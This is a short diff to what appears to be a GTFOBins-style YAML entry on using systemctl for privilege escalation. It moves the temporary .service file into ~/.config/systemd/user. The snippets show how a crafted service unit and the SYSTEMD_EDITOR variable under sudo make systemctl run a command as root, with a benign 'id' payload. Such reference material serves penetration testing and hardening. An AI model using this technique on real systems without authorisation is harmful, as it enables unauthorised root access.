@@ -2,7 +2,8 @@
 functions:
   suid:
     - code: |
-        TF=$(mktemp).service
+        mkdir -p ~/.config/systemd/user
+        TF=$(mktemp -p ~/.config/systemd/user).service
         echo '[Service]
         Type=oneshot
         ExecStart=/bin/sh -c "id > /tmp/output"
@@ -17,7 +18,8 @@ functions:
         chmod +x $TF
         sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
     - code: |
-        TF=$(mktemp).service
+        mkdir -p ~/.config/systemd/user/
+        TF=$(mktemp -p ~/.config/systemd/user).service
         echo '[Service]
         Type=oneshot
         ExecStart=/bin/sh -c "id > /tmp/output"
